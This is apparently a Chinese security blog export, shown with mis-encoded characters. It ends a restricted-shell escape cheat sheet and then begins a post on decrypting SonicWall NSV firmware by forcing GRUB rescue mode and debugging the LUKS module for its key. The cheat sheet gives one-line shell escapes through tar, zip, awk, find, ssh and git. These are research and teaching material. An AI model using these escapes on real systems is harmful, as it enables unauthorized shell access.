<h3 id="vi-x2F-vimã€edã€ftpã€gdbã€moreã€lessã€man-ç­‰æ–‡æœ¬ç¼–è¾‘-x2F-æ˜¾ç¤ºå·¥å…·"><a href="#vi-x2F-vimã€edã€ftpã€gdbã€moreã€lessã€man-ç­‰æ–‡æœ¬ç¼–è¾‘-x2F-æ˜¾ç¤ºå·¥å…·" class="headerlink" title="vi&#x2F;vimã€edã€ftpã€gdbã€moreã€lessã€man ç­‰æ–‡æœ¬ç¼–è¾‘&#x2F;æ˜¾ç¤ºå·¥å…·"></a>vi&#x2F;vimã€edã€ftpã€gdbã€moreã€lessã€man ç­‰æ–‡æœ¬ç¼–è¾‘&#x2F;æ˜¾ç¤ºå·¥å…·</h3><p>éƒ½å¯ä»¥é€šè¿‡è¾“å…¥ !&#x2F;bin&#x2F;sh è·å– shellï¼Œvi&#x2F;vim ä¸­è¦å…ˆè¾“å…¥å†’å·ã€‚</p>
<h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><p>tar å…·æœ‰ä¸€ä¸ª checkpoint å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°æŒ‡å®šæ¯å†™å…¥ n ä¸ªè®°å½•ä¹‹åè®¾ç½®ä¸€ä¸ªæ£€æŸ¥ç‚¹ï¼Œåœ¨æ£€æŸ¥ç‚¹å¯ä»¥æ‰§è¡Œä»»æ„æ“ä½œã€‚</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">tar -cf ./exp.tar ./* --checkpoint=1 --checkpoint-action=<span class="built_in">exec</span>=<span class="string">&quot;/bin/bash&quot;</span></span><br></pre></td></tr></table></figure></div>



<h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p>zip æœ‰ unzip-command å‚æ•°ï¼Œå¯ä»¥ç”¨äºæ‰§è¡Œå‘½ä»¤</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">zip ./test.zip ./test -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure></div>



<h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><p>scp -S å‚æ•°æŒ‡å®šä¸€ä¸ªç¨‹åºç”¨æ¥åŠ å¯†é“¾æ¥ï¼Œè¿™é‡Œå¯ä»¥æŒ‡å®šå¯æ§çš„è„šæœ¬æˆ–ç¨‹åº</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">scp -S ./1.sh ./test root@x.x.x.x:/tmp</span><br></pre></td></tr></table></figure></div>



<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div>



<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>find çš„ exec å‚æ•°å¯ä»¥ç”¨æ¥æ‰§è¡Œå‘½ä»¤</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">find ./ -name <span class="built_in">test</span> -<span class="built_in">exec</span> sh \;</span><br></pre></td></tr></table></figure></div>



<h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><ol>
<li>ssh -t å‚æ•°å¯ä»¥æŒ‡å®šåœ¨ç›®æ ‡ä¸Šæ‰§è¡Œçš„å‘½ä»¤</li>
</ol>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">ssh iot@192.168.152.129 -t <span class="string">&quot;ls&quot;</span></span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>ProxyCommand é€‰é¡¹</li>
</ol>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">ssh -o ProxyCommand=<span class="string">&quot;sh -c ./1.sh&quot;</span> 127.0.0.1</span><br></pre></td></tr></table></figure></div>



<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">help</span> status</span><br><span class="line">:/bin/sh</span><br></pre></td></tr></table></figure></div>



<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>nmap æ—©æœŸç‰ˆæœ¬(before May&#x2F;2009)æœ‰ä¸€ä¸ª â€“interactive å‚æ•°ï¼Œæ‰§è¡Œåè¿›å…¥äº¤äº’å¼ç»ˆç«¯ï¼Œç„¶åè¾“å…¥ !sh å³å¯è·å– shellã€‚</p>
<h3 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h3><p>tcpdump æœ‰ -z å‚æ•°ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„ç¨‹åºï¼Œä½†æ˜¯ä¸èƒ½æ§åˆ¶å‚æ•°ï¼Œtcpdump é»˜è®¤æä¾›ä¸€ä¸ªå‚æ•°å³ä¿å­˜çš„æ–‡ä»¶å</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">âœ  <span class="built_in">test</span> sudo tcpdump -n -i ens33 -G1 -w ./test -z gzip</span><br><span class="line">tcpdump: listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">gzip: ./test.gz: Permission denied</span><br><span class="line">gzip: ./test.gz: Permission denied</span><br><span class="line">gzip: ./test.gz: Permission denied</span><br></pre></td></tr></table></figure></div>



<h2 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h2><p><a class="link"   href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf" >https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.zeddyu.info/" >https://blog.zeddyu.info<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/" >https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>SonicOS å›ºä»¶è§£å¯† (1)</title>
    <url>/2022/02/08/sonicwall_dec1/</url>
    <content><![CDATA[<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">æœ¬æ–‡ç”±ä½œè€…é¦–å‘äºå®‰å…¨å®¢ï¼šhttps://www.anquanke.com/post/id/266078</span><br><span class="line">è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</span><br></pre></td></tr></table></figure></div>

<span id="more"></span>

<p>æœ€è¿‘ SonicWall å®˜æ–¹å‘å¸ƒäº†å½±å“ SonicOS çš„æ•°ä¸ªç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œç¼–å· CVE-2021-20048ã€CVE-2021-20046 ç­‰ã€‚åœ¨ç ”ç©¶å¤ç°è¿‡ç¨‹ä¸­å‘ç°é’ˆå¯¹æ­¤è®¾å¤‡çš„è§£åŒ…æ€è·¯æ¯”è¾ƒæœ‰è¶£ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œåˆ†äº«ç»™å¤§å®¶ã€‚</p>
<h3 id="å›ºä»¶è·å–"><a href="#å›ºä»¶è·å–" class="headerlink" title="å›ºä»¶è·å–"></a>å›ºä»¶è·å–</h3><p>è¯¥è®¾å¤‡å›ºä»¶å‰æ®µæ—¶é—´å¯ä»¥ä» mysonicwall ç½‘ç«™ä¸Šè·å–ï¼Œä½†ç›®å‰ sonicwall ä¸‹æ¶äº† nsv200(SonicOS GEN6) ç›¸å…³å›ºä»¶ï¼Œæ‰€ä»¥è¿™é‡Œæä¾›æ—§ç‰ˆå›ºä»¶çš„<a class="link"   href="https://pan.baidu.com/s/1O6iyLwHUgyQKSymsaVO7Iw" >ç½‘ç›˜é“¾æ¥<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>(æå–ç ï¼š1a30)ï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥è‡ªè¡Œä¸‹è½½ã€‚</p>
<h3 id="å®‰è£…å’Œé…ç½®"><a href="#å®‰è£…å’Œé…ç½®" class="headerlink" title="å®‰è£…å’Œé…ç½®"></a>å®‰è£…å’Œé…ç½®</h3><p>ç”¨ VMWare æ‰“å¼€ ova æ–‡ä»¶ï¼Œä¸€è·¯ç¡®å®šå¹¶ç­‰å¾…å¼€æœºå®Œæˆã€‚è™šæ‹Ÿæœºä¼šä» DHCP è‡ªåŠ¨è·å–åˆ° IP åœ°å€ï¼Œè®¿é—®å¯ä»¥çœ‹åˆ°ç™»å½•ç•Œé¢ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-1.png"
                     
                ></p>
<p>é»˜è®¤ç”¨æˆ·åå’Œå¯†ç ï¼šadmin:password</p>
<h3 id="è§£åŒ…"><a href="#è§£åŒ…" class="headerlink" title="è§£åŒ…"></a>è§£åŒ…</h3><h4 id="å¯åŠ¨åˆ†æ"><a href="#å¯åŠ¨åˆ†æ" class="headerlink" title="å¯åŠ¨åˆ†æ"></a>å¯åŠ¨åˆ†æ</h4><p>sonicwall nsv çš„é»˜è®¤ç»ˆç«¯æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰ CLI ç¨‹åºï¼Œä¸æä¾› Linux root shellï¼Œæ‰€ä»¥æƒ³è¦å¾—åˆ°å…³é”®æ–‡ä»¶ï¼Œå¿…é¡»è§£åŒ…å›ºä»¶ã€‚</p>
<p>æŸ¥çœ‹è™šæ‹Ÿæœºçš„å¯åŠ¨è¿‡ç¨‹ï¼Œè¾“å‡ºå¾ˆå°‘çš„ä¿¡æ¯ä¹‹åå°±ä¼šå‡ºç° sonicwall logo</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-2.png"
                     
                ></p>
<p>å‚å•†ä½¿ç”¨è¿™ç§æ–¹å¼é®è”½äº†ç³»ç»Ÿå¯åŠ¨æ—¶è¾“å‡ºçš„ä¿¡æ¯ï¼Œåªèƒ½ç›´æ¥ä»å›ºä»¶ä¸‹æ‰‹ã€‚</p>
<p>æ‰¾åˆ°è™šæ‹Ÿæœºçš„ vmdk ç£ç›˜æ–‡ä»¶ï¼Œä½¿ç”¨ 7-zip æ‰“å¼€ï¼Œå¯ä»¥çœ‹åˆ°å†…éƒ¨æœ‰æ•°ä¸ªåˆ†åŒºæ–‡ä»¶</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-3.png"
                     
                ></p>
<p>è¿™é‡Œä¹Ÿå¯å°è¯•ç›´æ¥å°†ç£ç›˜æŒ‚è½½åˆ°å·²æœ‰çš„ Linux è™šæ‹Ÿæœºä¸Šï¼Œè™šæ‹Ÿæœºè®¾ç½® -&gt; æ·»åŠ  -&gt; ç¡¬ç›˜ -&gt; SCSI -&gt; ä½¿ç”¨ç°æœ‰è™šæ‹Ÿç£ç›˜ -&gt; é€‰æ‹© sonicwall vmdk æ–‡ä»¶ -&gt; ä¿æŒç°æœ‰æ ¼å¼</p>
<p>æŒ‚è½½ä¹‹ååˆ†åŒºçŠ¶æ€å¦‚ä¸‹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-4.png"
                     
                ></p>
<p>ç³»ç»Ÿè¯†åˆ«åˆ° 4 ä¸ªåˆ†åŒºï¼Œä½†æ˜¯å…¨éƒ¨åŠ å¯†ï¼ŒçŒœæµ‹æ–‡ä»¶ç³»ç»Ÿå°±ä½äºå…¶ä¸­ä¸€ä¸ªåˆ†åŒºå†…ã€‚</p>
<p>ls æŸ¥çœ‹ &#x2F;dev&#x2F; ç›®å½•ä¸‹ä¿¡æ¯ï¼Œå‘ç°è¿˜æœ‰ sdb1ã€2 ç­‰æ²¡æœ‰åœ¨æ–‡ä»¶ç®¡ç†å™¨æ˜¾ç¤ºå‡ºæ¥ï¼Œå°è¯•æ‰‹åŠ¨æŒ‚è½½</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mount /dev/sdb1 ./test</span><br></pre></td></tr></table></figure></div>

<p>ç¬¬ä¸€ä¸ªåˆ†åŒºå­˜æ”¾äº† BOOT ç›¸å…³æ–‡ä»¶ï¼Œå¹¶æœ‰ä¸€ä¸ª coreos ç›®å½•ï¼Œå¯èƒ½æ˜¯åŸºäºå¼€æºé¡¹ç›®åˆ¶ä½œçš„ã€‚åœ¨ boot åˆ†åŒºä¸­æˆ‘ä»¬å‘ç°è™šæ‹Ÿæœºä½¿ç”¨äº† GRUB å¼•å¯¼ç³»ç»Ÿå¯åŠ¨ï¼ŒGRUB æ˜¯ä¸€ä¸ªå¸¸è§çš„å¯åŠ¨å¼•å¯¼ç¨‹åºï¼Œå®ƒå…·æœ‰å‘½ä»¤è¡ŒåŠŸèƒ½ã€‚æ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼Œå½“ç³»ç»Ÿå¼•å¯¼å¤±è´¥æ—¶ä¼šè‡ªåŠ¨è¿›å…¥ GRUB æ•‘æ´æ¨¡å¼ï¼Œå¯ä»¥æ‰§è¡Œä¸€äº›å’Œæ–‡ä»¶ç³»ç»Ÿç›¸å…³çš„æ“ä½œã€‚</p>
<h4 id="åŠ å¯†æ–¹å¼"><a href="#åŠ å¯†æ–¹å¼" class="headerlink" title="åŠ å¯†æ–¹å¼"></a>åŠ å¯†æ–¹å¼</h4><p>æ˜ç¡®äº†åç»­æ€è·¯ï¼Œæˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“åˆ†åŒºçš„åŠ å¯†æ–¹å¼æ˜¯ä»€ä¹ˆã€‚</p>
<p>ç”¨ 7-zip è§£å‹å‡ºå…¶ä¸­ä¸€ä¸ªè¾ƒå°çš„åŠ å¯†åˆ†åŒº OEM.imgï¼Œç„¶ååŠ è½½åˆ° 16 è¿›åˆ¶ç¼–è¾‘å™¨çœ‹åˆ°æ–‡ä»¶å¼€å¤´æ˜¯ LUKS</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-5.png"
                     
                ></p>
<p>LUKS æ˜¯ä¸€ç§ç£ç›˜åŠ å¯†æ ‡å‡†ï¼Œnsv è®¾å¤‡ä½¿ç”¨ LUKS å®ç°äº†å…¨ç›˜åŠ å¯†ã€‚</p>
<p>ç½‘ç»œä¸Šå­˜åœ¨ä¸€äº› LUKS å…¨ç›˜åŠ å¯†çš„<a class="link"   href="https://www.ajfriesen.com/decrypt-and-mount-luks-volume-in-grub-rescue-mode/" >è§£å¯†æ–¹æ³•<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œå¯ä»¥è¿›å…¥ GRUB çš„æ•‘æ´æ¨¡å¼å‘½ä»¤è¡Œå¹¶ä½¿ç”¨ cryptomount å‘½ä»¤&amp;å¯†ç è§£å¯†ã€‚ä½†ç›®å‰è¿˜ä¸çŸ¥é“åŠ å¯†å¯†ç æ˜¯ä»€ä¹ˆï¼Œéœ€è¦ç ”ç©¶ä¸€ä¸‹ LUKS çš„åŠ å¯†é€»è¾‘ã€‚</p>
<p>æ—¢ç„¶ç³»ç»Ÿå¯ä»¥æ­£å¸¸å¯åŠ¨ï¼Œè¯´æ˜åœ¨å¼•å¯¼é˜¶æ®µå°±é€šè¿‡æŸç§æ–¹å¼è§£å¯†äº†å„ä¸ªåˆ†åŒºã€‚å‚è€ƒåˆ†åŒºçš„åŠ å¯†æ–¹å¼ï¼Œå¯†ç åº”è¯¥è¢«ä¿å­˜åœ¨ luks ç›¸å…³çš„æ¨¡å—ä¸­ã€‚</p>
<p>å…³äº LUKS è§£å¯†çš„å…·ä½“é€»è¾‘å¯å‚è€ƒå®ƒçš„é¡¹ç›®æºç ï¼Œè§£å¯†å…³é”®å‡½æ•°æ˜¯ grub_crypto_pbkdf2ï¼ŒåŸå‹å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">grub_crypto_pbkdf2 (<span class="type">const</span> <span class="keyword">struct</span> gcry_md_spec *md,</span><br><span class="line">		    <span class="type">const</span> <span class="type">grub_uint8_t</span> *P, <span class="type">grub_size_t</span> Plen,</span><br><span class="line">		    <span class="type">const</span> <span class="type">grub_uint8_t</span> *S, <span class="type">grub_size_t</span> Slen,</span><br><span class="line">		    <span class="type">unsigned</span> <span class="type">int</span> c,</span><br><span class="line">		    <span class="type">grub_uint8_t</span> *DK, <span class="type">grub_size_t</span> dkLen)</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯ç”¨äºè§£å¯†åˆ†åŒºçš„å¯†é’¥ã€‚</p>
<p>åœ¨ BOOT åˆ†åŒºæœç´¢æ­£å¥½å¯ä»¥æ‰¾åˆ° luks.mod æ¨¡å—ï¼Œå°†å®ƒè§£å‹ï¼Œç„¶åç”¨ IDA åˆ†æï¼Œé€šè¿‡äº¤å‰å¼•ç”¨æ‰¾åˆ°è§£å¯†ç›¸å…³ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">grub_real_dprintf(<span class="string">&quot;disk/luks.c&quot;</span>, <span class="number">246LL</span>, <span class="string">&quot;luks&quot;</span>, <span class="string">&quot;Trying keyslot %d\n&quot;</span>, k);</span><br><span class="line">v32 = grub_crypto_pbkdf2(*(a2 + <span class="number">88</span>), a4, v43, v31, <span class="number">32LL</span>, _byteswap_ulong(*(v31 - <span class="number">1</span>)), v51, v38);</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬çœ‹åˆ°è§£å¯†æ—¶ä¼šè¾“å‡º log ä¿¡æ¯ â€œTrying keyslot xxâ€ï¼Œè€Œå˜é‡ a4 åº”è¯¥å°±æ˜¯ keyã€‚</p>
<h4 id="æå–å¯†é’¥"><a href="#æå–å¯†é’¥" class="headerlink" title="æå–å¯†é’¥"></a>æå–å¯†é’¥</h4><p>ä¸ºäº†è§£å¯†åˆ†åŒºï¼Œéœ€è¦é€šè¿‡æŸç§æ‰‹æ®µè·å–æ¨¡å—ä¸­çš„å¯†é’¥ï¼Œè€Œå¯†é’¥åˆä¿å­˜åœ¨ luks æ¨¡å—ä¸­ï¼Œæ‰€ä»¥å…·ä½“æ€è·¯æ˜¯è¿›å…¥ GRUB å‘½ä»¤è¡Œï¼Œç„¶ååŠ è½½å’Œè§£å¯†ç›¸å…³çš„å„ä¸ªæ¨¡å—ï¼Œæ¥ç€åˆ©ç”¨è°ƒè¯•å™¨é™„åŠ åˆ° luks.mod ä¸Šï¼Œå°è¯•ä¸­æ–­åœ¨ grub_crypto_pbkdf2 å‡½æ•°ï¼Œå¹¶æå–å…¶å‚æ•°ã€‚</p>
<p>ä¸ºäº†èƒ½å®Œæˆä¸Šè¿°æ“ä½œï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€ç§èƒ½å¤Ÿåœ¨å¯åŠ¨è™šæ‹Ÿæœºåä»å¤–éƒ¨ä¿®æ”¹æ–‡ä»¶çš„æ–¹å¼ã€‚è¿™ä¸€ç‚¹å¯åˆ©ç”¨ qemu-nbd å®ç°ã€‚</p>
<p>å…¶æ¬¡è¿˜è¦æ”¯æŒè°ƒè¯•å™¨ï¼Œç”¨äºè°ƒè¯• luks ç›¸å…³æ¨¡å—ã€‚å¯ä»¥åˆ©ç”¨ Linux ä¸‹è™šæ‹ŸåŒ–å¹³å° QEMU&#x2F;KVM è™šæ‹Ÿæœºå®ç°ã€‚</p>
<p><strong>å·¥å…·é…ç½®</strong></p>
<p>å®‰è£… qemu-utils å’Œ KVM &amp; VMM</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install qemu-utils</span><br><span class="line">sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils virtinst virt-manager</span><br></pre></td></tr></table></figure></div>

<p><strong>è½¬æ¢é•œåƒ</strong></p>
<p>vmware ä½¿ç”¨çš„æ˜¯ vmdk è™šæ‹Ÿç£ç›˜é•œåƒï¼Œä¸ºäº†ä½¿ç”¨ qemu-nbd ä¿®æ”¹é•œåƒï¼Œé¦–å…ˆè¦æŠŠ vmdk è½¬æ¢æˆ qcow2 æ ¼å¼ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-img convert -f vmdk ./image.vmdk -O qcow2 sonicwall.qcow2</span><br></pre></td></tr></table></figure></div>

<p><strong>é…ç½®è™šæ‹Ÿæœº</strong></p>
<p>æ³¨ï¼šè™šæ‹Ÿæœºéœ€è¦å¼€å¯ Intel-VTx æˆ– AMD-V æ”¯æŒã€‚</p>
<p>å°†è½¬æ¢ä¹‹åçš„é•œåƒä½¿ç”¨ qemu-nbd æŒ‚è½½åˆ°æœ¬åœ°</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">sudo modprobe nbd max_part=8    <span class="comment"># åŠ è½½ nbd æ¨¡å—</span></span><br><span class="line">sudo qemu-nbd --connect=/dev/nbd0 ./sonicwall.qcow2    <span class="comment"># æŒ‚è½½é•œåƒ</span></span><br><span class="line">sudo fdisk /dev/nbd0 -l    <span class="comment"># æŸ¥çœ‹åˆ†åŒºä¿¡æ¯</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-6.png"
                     
                ></p>
<p>æ­¤æ—¶å·²ç»æˆåŠŸæŒ‚è½½ã€‚</p>
<p>ç„¶åå¯¼å…¥æŒ‚è½½çš„é•œåƒåˆ° KVM è™šæ‹Ÿæœºï¼Œåœ¨ VMM ä¸­æ·»åŠ ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œå¯¼å…¥ç°æœ‰ç£ç›˜æ˜ åƒ -&gt; å­˜å‚¨è·¯å¾„ï¼š&#x2F;dev&#x2F;nbd0</p>
<p><strong>é…ç½®è°ƒè¯•æ¥å£</strong></p>
<p>å’Œ vmware ä¸€æ ·ï¼ŒKVM ä¹Ÿæ”¯æŒå¯¹è™šæ‹Ÿæœºæ·»åŠ è°ƒè¯•æ¥å£ï¼Œåœ¨ç»ˆç«¯è¾“å…¥å‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">virsh edit &lt;è™šæ‹Ÿæœºåç§°&gt;</span><br></pre></td></tr></table></figure></div>

<p>è¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼ï¼Œéšæ„é€‰æ‹©ä¸€ä¸ªç¼–è¾‘å™¨ä¿®æ”¹é…ç½®æ–‡ä»¶ã€‚</p>
<p>ä¿®æ”¹ &lt;domain type&#x3D;â€™kvmâ€™&gt; ä¸º</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;domain type=&#x27;kvm&#x27;</span><br><span class="line">        xmlns:qemu=&#x27;http://libvirt.org/schemas/domain/qemu/1.0&#x27; &gt;</span><br><span class="line">        &lt;qemu:commandline&gt;</span><br><span class="line">        &lt;qemu:arg value=&#x27;-gdb&#x27;/&gt;</span><br><span class="line">        &lt;qemu:arg value=&#x27;tcp::12345&#x27;/&gt;</span><br><span class="line">        &lt;/qemu:commandline&gt;</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·å½“è™šæ‹Ÿæœºå¯åŠ¨ä¹‹åå°±å¯ä»¥ç”¨ gdb é™„åŠ åˆ° localhost:12345 å¯¹å…¶è¿›è¡Œè°ƒè¯•äº†ã€‚</p>
<p><strong>è¿›å…¥æ•‘æ´æ¨¡å¼</strong></p>
<p>æˆ‘ä»¬é‡å‘½å boot åˆ†åŒºä¸­çš„ä¸€äº›æ–‡ä»¶ï¼Œå½“ GRUB å¼•å¯¼æ—¶å°±ä¼šç”±äºæ‰¾ä¸åˆ°å…³é”®æ–‡ä»¶è€Œè¿›å…¥æ•‘æ´æ¨¡å¼ã€‚</p>
<p>é¦–å…ˆæŒ‚è½½ nbd ä¸­çš„ BOOT åˆ†åŒºåˆ°æœ¬åœ°ç›®å½•ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mount /dev/nbd0p1 ./test</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åè¿›å…¥ &#x2F;coreos&#x2F;grub ç›®å½•ï¼Œå¹¶é‡å‘½åå…¶ä¸­çš„ä¸‰ä¸ªç›®å½•</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv i386-pc i386-pc-bak</span><br><span class="line">mv x86_64-efi x86_64-efi-bak</span><br><span class="line">mv x86_64-xen x86_64-xen-bak</span><br><span class="line">sync</span><br><span class="line">sync</span><br></pre></td></tr></table></figure></div>

<p>å¯åŠ¨è™šæ‹Ÿæœºï¼Œæ­¤æ—¶ç³»ç»Ÿä¼šè‡ªåŠ¨è¿›å…¥æ•‘æ´æ¨¡å¼ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-7.png"
                     
                ></p>
<p>è¿™é‡Œå¯ç”¨ TAB é”®çœ‹çœ‹æœ‰å“ªäº›å¯ç”¨çš„å‘½ä»¤ã€‚</p>
<p>ls å‘½ä»¤æ˜¾ç¤ºåˆ†åŒºåˆ—è¡¨</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-8.png"
                     
                ></p>
<p><strong>ä½¿ç”¨è§£å¯†åŠŸèƒ½</strong></p>
<p>è§£å¯†åˆ†åŒºå‘½ä»¤ä¸º cryptomountï¼Œä¸è¿‡åœ¨ä½¿ç”¨ä¹‹å‰éœ€è¦æ¢å¤ BOOT åˆ†åŒºä¸­çš„ç›®å½•åã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv ./i386-pc-bak i386-pc     </span><br><span class="line">mv x86_64-efi-bak x86_64-efi     </span><br><span class="line">mv x86_64-xen-bak x86_64-xen</span><br><span class="line">sync</span><br><span class="line">sync</span><br></pre></td></tr></table></figure></div>

<p>ä½¿ç”¨ cryptomount å°è¯•è§£å¯† (hd0,gpt3) æŠ¥é”™</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-9.png"
                     
                ></p>
<p>è¿™æ˜¯å› ä¸ºç›¸å…³æ¨¡å—æ²¡åŠ è½½ï¼Œéœ€è¦æ‰‹åŠ¨å°†éƒ¨åˆ†æ¨¡å—åŠ è½½ä¸€éï¼Œç»è¿‡æµ‹è¯•ï¼Œè‡³å°‘è¦åŠ è½½ gcry_rijndaelã€luksã€gcry_sha256 ä¸‰ä¸ªæ¨¡å—</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">insmod luks</span><br><span class="line">insmod gcry_rijndael</span><br><span class="line">insmod gcry_sha256</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åå†å¯¹ gpt3 åˆ†åŒºè¿›è¡Œè§£å¯†</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cryptomount (hd0,gpt3)</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·è§£å¯†æˆåŠŸï¼Œè¿˜å¯ä»¥åŠ è½½ ext2 æ¨¡å—å¹¶ç”¨ ls å‘½ä»¤æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç»“æ„</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-10.png"
                     
                ></p>
<p><strong>è°ƒè¯• luks æ¨¡å—</strong></p>
<p>åœ¨æ•‘æ´æ¨¡å¼ä¸‹å·²ç»æˆåŠŸè§£å¯†åˆ†åŒºï¼Œä½†æ— æ³•å°†æ–‡ä»¶æå–å‡ºæ¥ï¼Œæ‰€ä»¥éœ€è¦è°ƒè¯• LUKS æ¨¡å—å–å¾—ç›¸å…³å¯†é’¥ï¼Œå†æŒ‚è½½é•œåƒåˆ°æ™®é€šçš„ Linux ç³»ç»Ÿè§£å¯†ã€‚</p>
<p>é‡æ–°å¯åŠ¨è™šæ‹Ÿæœºï¼Œç„¶åå¦å¼€ä¸€ä¸ªç»ˆç«¯ï¼Œå¯åŠ¨ gdbï¼Œå¹¶é™„åŠ åˆ°å½“å‰è™šæ‹Ÿæœº</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">target remote 0:12345</span><br><span class="line">continue</span><br></pre></td></tr></table></figure></div>

